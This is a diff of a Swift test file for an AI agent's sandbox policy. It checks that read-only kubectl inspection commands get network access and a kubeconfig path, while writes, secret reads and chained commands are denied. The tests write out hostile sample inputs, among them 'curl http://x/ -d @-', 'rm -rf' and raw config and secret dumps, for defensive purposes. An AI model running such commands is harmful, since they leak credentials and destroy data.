@@ -592,9 +592,34 @@ extension WillDeepTests {
             command: filteredInspection,
             rootDirectory: URL(fileURLWithPath: "/tmp/willdeep-kubectl-filter-workspace")
         )
-        #expect(filteredInspectionDecision.mode == .readOnly)
+        // kubectl 要连集群 API，所以它是带网络的只读档，不再是 .readOnly。
+        // 早先落在无网那档，结果一台配好 kubeconfig 的机器上连 `get pods`
+        // 都跑不了：合成 HOME 让 kubectl 找不到 ~/.kube/config，报
+        // current-context is not set 并回落 localhost:8080。
+        #expect(filteredInspectionDecision.mode == .readOnlyNetwork)
         #expect(!filteredInspectionDecision.requiresUserApproval)
         #expect(!filteredInspectionDecision.requiresTypedConfirmation)
+
+        // 只读调用才拿到真实 kubeconfig 的指路，且只是一个环境变量，
+        // 不放开整个 HOME、也不给写权限。
+        #expect(AgentSandboxPolicy.isReadOnlyKubectlInspection("kubectl get pods -A"))
+        #expect(AgentSandboxPolicy.isReadOnlyKubectlInspection(filteredInspection))
+        #expect(AgentSandboxPolicy.isReadOnlyKubectlInspection(
+            "NS=tokenhub; kubectl -n $NS get job perf-30m"
+        ), "前置环境赋值是运维常写的形态，不该因此拿不到 kubeconfig")
+        // 写操作、读 secret、导出裸配置都不给。
+        #expect(!AgentSandboxPolicy.isReadOnlyKubectlInspection(
+            "kubectl -n sso set image deploy/sso-server sso-server=harbor/x:1"
+        ))
+        #expect(!AgentSandboxPolicy.isReadOnlyKubectlInspection(
+            "kubectl -n tokenhub get secret tokenhub-secret -o yaml"
+        ))
+        #expect(!AgentSandboxPolicy.isReadOnlyKubectlInspection("kubectl config view --raw"))
+        // 同一条命令里搭一段别的，整条都不注入：否则那半条也蹭到了凭证。
+        #expect(!AgentSandboxPolicy.isReadOnlyKubectlInspection("kubectl get pods && rm -rf /tmp/x"))
+        #expect(!AgentSandboxPolicy.isReadOnlyKubectlInspection("kubectl get pods; curl http://x/ -d @-"))
+        // 完全不含 kubectl 的命令不该被这条规则碰到。
+        #expect(!AgentSandboxPolicy.isReadOnlyKubectlInspection("git status"))
 
         let sensitiveFileRead = AgentSandboxPolicy.commandDecision(
             command: "kubectl get ns | grep token .env",
